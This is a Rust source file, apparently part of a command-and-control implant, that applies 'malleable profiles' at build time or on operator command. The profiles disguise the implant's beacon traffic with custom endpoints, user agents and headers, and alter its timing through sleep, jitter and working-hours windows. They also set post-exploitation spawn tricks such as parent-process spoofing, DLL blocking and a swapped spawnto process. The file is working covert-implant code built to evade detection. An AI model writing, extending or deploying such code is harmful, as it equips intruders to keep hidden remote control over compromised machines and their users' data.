// profile.rs — Runtime Malleable Profile engine (v3)
//
// WHAT THIS IS:
//   The agent's RUNTIME-MUTABLE behavior state. Two sources feed it:
//
//     1. BUILD-TIME BAKE  — server embeds the selected profile as JSON inside
//        the ENCRYPTED config blob (see build_handler.go v3). init_from_baked()
//        applies it once at startup, so the agent speaks the profile dialect
//        from its very first check-in.
//
//     2. OPERATOR COMMAND — `profile <name>` in a session terminal. The
//        server resolves the TOML profile, validates it and sends an
//        `update_profile` task carrying the same JSON. set_from_task_json()
//        swaps the active state ATOMICALLY — the agent never needs a rebuild
//        or re-download to change its traffic shape or timing.
//
// v3 RUNTIME-APPLICABLE FIELDS (the "profile is a hint, code is baked" model):
//   endpoint / get_endpoint / user_agent / headers / get_headers → wire dialect
//   (v4: get_headers = GET-poll header dialect; GET polls fall back to
//   "headers" when a profile omits them — pre-v4 behaviour preserved)
//   timing.sleep_override_s / timing.jitter_override /
//   timing.working_hours                            → live beacon re-timing
//   postex.{spawnto,ppid,blockdlls}                 → spawn profile
//   poll_mode                                       → post vs get heartbeat
//   Everything else (evasion/resilience/hosts/bootstrap/kill_date) is
//   BUILD-TIME ONLY — logged and ignored here (those live in the encrypted
//   blob; they must exist before the first network byte).
//
// SAFETY RULES (all enforced here, server validates too):
//   - endpoint/get_endpoint must start with '/' and be <= 256 chars
//   - user-agent <= 256 chars, no CR/LF (header injection)
//   - max 8 headers; names [A-Za-z0-9-]{1,64}; values <= 256, no CR/LF
//   - Host / Content-Length / Transfer-Encoding headers are STRIPPED
//
use std::sync::RwLock;
use std::sync::atomic::{AtomicU64, Ordering};

#[derive(Clone, Debug, Default)]
pub struct WireProfile {
    pub name: String,
    pub endpoint: Option<String>,       // POST URI override
    pub get_endpoint: Option<String>,   // v3: GET poll URI override
    pub user_agent: Option<String>,     // UA override
    pub headers: Vec<(String, String)>, // fixed extra headers (POST dialect)
    pub get_headers: Vec<(String, String)>, // v4: GET-poll header overrides
}

/// v3: post-ex spawn profile — consumed by exec::dispatcher for every
/// process spawn (ppid spoof, block-dlls mitigation, spawnto shell swap).
#[derive(Clone, Debug)]
pub struct PostexCfg {
    pub spawnto: String,   // full path; empty = use COMSPEC
    pub ppid: String,      // parent image name; empty = no spoof
    pub blockdlls: bool,   // block non-Microsoft DLLs in children
}

static RUNTIME_PROFILE: RwLock<Option<WireProfile>> = RwLock::new(None);
static POSTEX: RwLock<Option<PostexCfg>> = RwLock::new(None);
static POLL_MODE: RwLock<Option<String>> = RwLock::new(None);

// Timing overrides (operator/profile-controlled, live-applied)
static WORKING_HOURS_OVERRIDE: RwLock<Option<String>> = RwLock::new(None);
static JITTER_OVERRIDE_PCT: AtomicU64 = AtomicU64::new(0); // percent 1..=100, 0 = off

/// Snapshot of the active profile (None = default built-in dialect).
pub fn get() -> Option<WireProfile> {
    RUNTIME_PROFILE.read().ok().and_then(|g| g.clone())
}

/// v3 getters used by the beacon loop / dispatcher.
pub fn jitter_override_pct() -> u64 {
    JITTER_OVERRIDE_PCT.load(Ordering::SeqCst)
}

pub fn working_hours_override() -> Option<String> {
    WORKING_HOURS_OVERRIDE.read().ok().and_then(|g| g.clone())
}

// ── v5: live operator setters (used by `jitter`, `sleep <s> <j%>` and
//    `working_hours` inline commands) ─────────────────────────────────────
// The profile-apply path (set_from_json → timing section) shares these via
// the same statics, so command- and profile-driven changes always agree.

/// Live jitter override. `pct` clamped to 0..=100; 0 = clear the override
/// (jittered_sleep falls back to the baked/profile jitter fraction).
pub fn set_jitter_override_pct(pct: u64) {
    JITTER_OVERRIDE_PCT.store(pct.min(100), Ordering::SeqCst);
}

/// Live working-hours override. `None` (or an empty window) clears it —
/// the beacon gate then falls back to the baked `working_hours`.
/// Err on a malformed "HH:MM-HH:MM" string; the caller surfaces it.
pub fn set_working_hours_override(wh: Option<String>) -> Result<(), String> {
    match wh {
        None => {
            if let Ok(mut g) = WORKING_HOURS_OVERRIDE.write() { *g = None; }
            Ok(())
        }
        Some(s) => {
            let s = s.trim().to_string();
            if s.is_empty() {
                if let Ok(mut g) = WORKING_HOURS_OVERRIDE.write() { *g = None; }
                return Ok(());
            }
            if !valid_working_hours(&s) {
                return Err(format!("invalid window '{}' — expected HH:MM-HH:MM", s));
            }
            if let Ok(mut g) = WORKING_HOURS_OVERRIDE.write() { *g = Some(s); }
            Ok(())
        }
    }
}

pub fn poll_mode() -> Option<String> {
    POLL_MODE.read().ok().and_then(|g| g.clone())
}

pub fn postex() -> Option<PostexCfg> {
    POSTEX.read().ok().and_then(|g| g.clone())
}

/// Build-time entry: apply the JSON baked into config.profile_json (if any).
/// Never fails the agent — a malformed bake logs and is ignored.
pub fn init_from_baked(profile_json: &str) {
    let s = profile_json.trim();
    if s.is_empty() || s == "none" || s == "None" {
        return;
    }
    match set_from_json(s) {
        Ok(name) => crate::core_agent::debug_log(&format!(
            "[PROFILE] baked malleable profile applied: {}", name)),
        Err(e) => crate::core_agent::debug_log(&format!(
            "[PROFILE] baked profile rejected ({}): {}", e, s)),
    }
}

/// Runtime entry: apply an `update_profile` task payload.
/// Returns the profile name on success, human-readable error otherwise.
pub fn set_from_task_json(args_json: &str) -> Result<String, String> {
    let name = set_from_json(args_json)?;
    crate::core_agent::debug_log(&format!(
        "[PROFILE] runtime profile switched: {}", name));
    Ok(name)
}

/// Shared parser/validator/applier.
fn set_from_json(json: &str) -> Result<String, String> {
    let v: serde_json::Value =
        serde_json::from_str(json).map_err(|e| format!("parse profile json: {}", e))?;

    let name = v.get("name").and_then(|x| x.as_str()).unwrap_or("unnamed");
    let name = name.chars().take(64).collect::<String>();

    // ── endpoint (POST URI) ───────────────────────────────────────────────
    let endpoint = parse_endpoint(v.get("endpoint"), "endpoint")?;

    // ── v3: get_endpoint (GET poll URI) ───────────────────────────────────
    let get_endpoint = parse_endpoint(v.get("get_endpoint"), "get_endpoint")?;

    // ── user agent ────────────────────────────────────────────────────────
    let user_agent = match v.get("user_agent").and_then(|x| x.as_str()) {
        Some("") | None => None,
        Some(ua) => {
            let ua = ua.trim().to_string();
            if ua.len() > 256 {
                return Err("user_agent exceeds 256 chars".into());
            }
            if ua.contains('\r') || ua.contains('\n') {
                return Err("user_agent contains CR/LF".into());
            }
            Some(ua)
        }
    };

    // ── headers ───────────────────────────────────────────────────────────
    // v4: "headers" applies to POST (checkin/results); "get_headers" applies
    // to GET-poll requests when present — comms falls back to "headers" when
    // a profile omits them (pre-v4 behaviour). Identical validation for both.
    let headers = parse_header_map(&v, "headers")?;
    let get_headers = parse_header_map(&v, "get_headers")?;

    // ── timing (live-applied) ─────────────────────────────────────────────
    // sleep_override_s: seconds, 1..=604_800 (like `sleep <s>`)
    // jitter_override:  percent 1..=100 (values <= 1 are treated as a
    //                   fraction 0.0..=1.0 and scaled ×100 for back-compat)
    // working_hours:    "HH:MM-HH:MM" — live gate override
    if let Some(t) = v.get("timing").and_then(|x| x.as_object()) {
        let sos = t.get("sleep_override_s").and_then(|x| x.as_f64()).unwrap_or(0.0);
        if sos > 0.0 && sos <= 604_800.0 {
            crate::core_agent::beacons::https_beacon::set_sleep_override_ms((sos as u64) * 1000);
            crate::core_agent::debug_log(&format!(
                "[PROFILE] timing.sleep_override_s={} applied", sos as u64));
        }
        if let Some(jv) = t.get("jitter_override").and_then(|x| x.as_f64()) {
            if jv > 0.0 && jv <= 100.0 {
                let pct = if jv <= 1.0 { (jv * 100.0) as u64 } else { jv as u64 };
                JITTER_OVERRIDE_PCT.store(pct, Ordering::SeqCst);
                crate::core_agent::debug_log(&format!(
                    "[PROFILE] timing.jitter_override={} applied (pct={})", jv, pct));
            }
        }
        if let Some(wh) = t.get("working_hours").and_then(|x| x.as_str()) {
            let wh = wh.trim().to_string();
            if !wh.is_empty() && !valid_working_hours(&wh) {
                return Err(format!("timing.working_hours invalid: {}", wh));
            }
            if wh.is_empty() {
                // explicit empty = clear the override
                if let Ok(mut g) = WORKING_HOURS_OVERRIDE.write() { *g = None; }
            } else {
                if let Ok(mut g) = WORKING_HOURS_OVERRIDE.write() { *g = Some(wh.clone()); }
                crate::core_agent::debug_log(&format!(
                    "[PROFILE] timing.working_hours='{}' applied", wh));
            }
        }
    }

    // ── v3: poll_mode ─────────────────────────────────────────────────────
    if let Some(pm) = v.get("poll_mode").and_then(|x| x.as_str()) {
        let pm = pm.trim().to_lowercase();
        match pm.as_str() {
            "" => {}
            "post" | "get" => {
                if let Ok(mut g) = POLL_MODE.write() { *g = Some(pm.clone()); }
                crate::core_agent::debug_log(&format!("[PROFILE] poll_mode={} applied", pm));
            }
            other => return Err(format!("poll_mode invalid: {}", other)),
        }
    }

    // ── v3: postex (live-applied spawn profile) ───────────────────────────
    if let Some(px) = v.get("postex").and_then(|x| x.as_object()) {
        let spawnto = px.get("spawnto").and_then(|x| x.as_str()).unwrap_or("").trim().to_string();
        if spawnto.len() > 260 || spawnto.contains('\r') || spawnto.contains('\n') || spawnto.contains('\0') {
            return Err("postex.spawnto invalid (too long or control chars)".into());
        }
        let ppid = px.get("ppid").and_then(|x| x.as_str()).unwrap_or("").trim().to_string();
        if !ppid.is_empty() && (ppid.len() > 64 || !ppid.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '_' || c == '-')) {
            return Err(format!("postex.ppid invalid: {}", ppid));
        }
        let blockdlls = px.get("blockdlls").and_then(|x| x.as_bool()).unwrap_or(false);
        if spawnto.is_empty() && ppid.is_empty() && !blockdlls {
            // empty section → clear postex
            if let Ok(mut g) = POSTEX.write() { *g = None; }
        } else {
            if let Ok(mut g) = POSTEX.write() {
                *g = Some(PostexCfg { spawnto, ppid, blockdlls });
            }
            crate::core_agent::debug_log("[PROFILE] postex spawn profile applied");
        }
    }

    // ── build-time-only sections: acknowledged, ignored at runtime ───────
    for key in &["evasion", "resilience", "hosts", "bootstrap", "kill_date"] {
        if v.get(*key).is_some() {
            crate::core_agent::debug_log(&format!(
                "[PROFILE] '{}' is build-time only (lives in the encrypted bake) — ignored at runtime", key));
        }
    }

    let profile = WireProfile { name, endpoint, get_endpoint, user_agent, headers, get_headers };
    let out_name = profile.name.clone();
    *RUNTIME_PROFILE.write().map_err(|_| "profile lock poisoned")? = Some(profile);
    Ok(out_name)
}

/// Shared header-map parser: "headers" (POST dialect) and "get_headers"
/// (v4 GET-poll dialect). Same contract for both: transport-owned headers
/// skipped, name [A-Za-z0-9-]{1,64}, value <=256 chars no CR/LF, max 8.
fn parse_header_map(v: &serde_json::Value, key: &str) -> Result<Vec<(String, String)>, String> {
    let mut headers: Vec<(String, String)> = Vec::new();
    if let Some(map) = v.get(key).and_then(|x| x.as_object()) {
        for (k, val) in map {
            let k = k.trim();
            if k.is_empty() {
                continue;
            }
            // transport-owned headers are never overridable
            let kl = k.to_ascii_lowercase();
            if kl == "host" || kl == "content-length" || kl == "transfer-encoding" {
                continue;
            }
            if k.len() > 64 || !k.chars().all(|c| c.is_ascii_alphanumeric() || c == '-') {
                return Err(format!("bad header name: {}", k));
            }
            let val = val.as_str().unwrap_or("").trim().to_string();
            if val.len() > 256 {
                return Err(format!("header value too long: {}", k));
            }
            if val.contains('\r') || val.contains('\n') {
                return Err(format!("header value contains CR/LF: {}", k));
            }
            if headers.len() >= 8 {
                return Err("too many headers (max 8)".into());
            }
            headers.push((k.to_string(), val));
        }
    }
    Ok(headers)
}

/// Endpoint validator shared by endpoint + get_endpoint.
fn parse_endpoint(raw: Option<&serde_json::Value>, field: &str) -> Result<Option<String>, String> {
    match raw.and_then(|x| x.as_str()) {
        Some("") | None => Ok(None),
        Some(ep) => {
            let ep = ep.trim().to_string();
            if !ep.starts_with('/') {
                return Err(format!("{} must start with '/' (got: {})", field, ep));
            }
            if ep.len() > 256 {
                return Err(format!("{} exceeds 256 chars", field));
            }
            if ep.contains('\r') || ep.contains('\n') {
                return Err(format!("{} contains CR/LF", field));
            }
            Ok(Some(ep))
        }
    }
}

/// Loose "HH:MM-HH:MM" validation (mirrors the beacon gate's tolerance:
/// an unparseable window is treated as always-active, never as a lockout).
fn valid_working_hours(wh: &str) -> bool {
    let parts: Vec<&str> = wh.split('-').collect();
    if parts.len() != 2 { return false; }
    for p in parts {
        let hm: Vec<&str> = p.split(':').collect();
        if hm.len() != 2 { return false; }
        let h: u32 = match hm[0].parse() { Ok(v) => v, Err(_) => return false };
        let m: u32 = match hm[1].parse() { Ok(v) => v, Err(_) => return false };
        if h > 23 || m > 59 { return false; }
    }
    true
}
